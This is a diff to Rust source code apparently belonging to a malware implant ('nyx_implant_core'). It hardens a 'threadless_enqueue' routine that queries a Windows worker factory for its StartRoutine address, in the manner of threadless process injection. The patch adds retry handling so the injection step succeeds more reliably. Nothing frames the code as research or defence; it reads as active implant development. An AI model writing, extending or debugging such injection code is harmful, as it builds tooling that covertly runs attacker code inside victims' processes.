@@ -915,7 +915,15 @@ unsafe fn threadless_enqueue(
     let mut cap = WFBI_BUF as u32;
     let mut ret_len: u32 = 0;
     let mut qst: i32;
+    let mut attempts: u32 = 0;
     loop {
+        attempts = attempts.saturating_add(1);
+        if attempts > 4 {
+            unsafe { close_handle(worker_factory_h) };
+            return Err(String::from(
+                "threadless: NtQueryInformationWorkerFactory(BasicInformation) retry exhausted",
+            ));
+        }
         qst = unsafe {
             query_wf(
                 worker_factory_h,
@@ -929,23 +937,29 @@ unsafe fn threadless_enqueue(
             break;
         }
         const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC000_0004u32 as i32;
-        if qst != STATUS_INFO_LENGTH_MISMATCH || ret_len <= cap || ret_len > 0x1000 {
-            unsafe { close_handle(worker_factory_h) };
-            let mut s = String::from(
-                "threadless: NtQueryInformationWorkerFactory(BasicInformation) failed st=",
-            );
-            nyx_implant_core::fmt::push_decimal_u32(&mut s, qst as u32);
-            s.push_str(" ret=");
-            nyx_implant_core::fmt::push_decimal_u32(&mut s, ret_len);
-            return Err(s);
+        // Hosted 5afd0f5: st=0xC0000004 ret=120 with a 256-byte buffer. Retry
+        // at the kernel's ReturnLength (120 == sizeof WFBI). If that still
+        // mismatches but the buffer holds StartRoutine, use it anyway.
+        if qst == STATUS_INFO_LENGTH_MISMATCH
+            && ret_len > 0
+            && (ret_len as usize) <= WFBI_BUF
+        {
+            if ret_len < cap {
+                cap = ret_len;
+                continue;
+            }
+            if (ret_len as usize) >= WFBI_START_ROUTINE_OFF + 8 {
+                break;
+            }
         }
-        cap = ret_len;
-        if (cap as usize) > WFBI_BUF {
-            unsafe { close_handle(worker_factory_h) };
-            return Err(String::from(
-                "threadless: BasicInformation ReturnLength exceeds stack buf",
-            ));
-        }
+        unsafe { close_handle(worker_factory_h) };
+        let mut s = String::from(
+            "threadless: NtQueryInformationWorkerFactory(BasicInformation) failed st=",
+        );
+        nyx_implant_core::fmt::push_decimal_u32(&mut s, qst as u32);
+        s.push_str(" ret=");
+        nyx_implant_core::fmt::push_decimal_u32(&mut s, ret_len);
+        return Err(s);
     }
     let info = info64.as_ptr() as *const u8;
     let start_routine = unsafe {
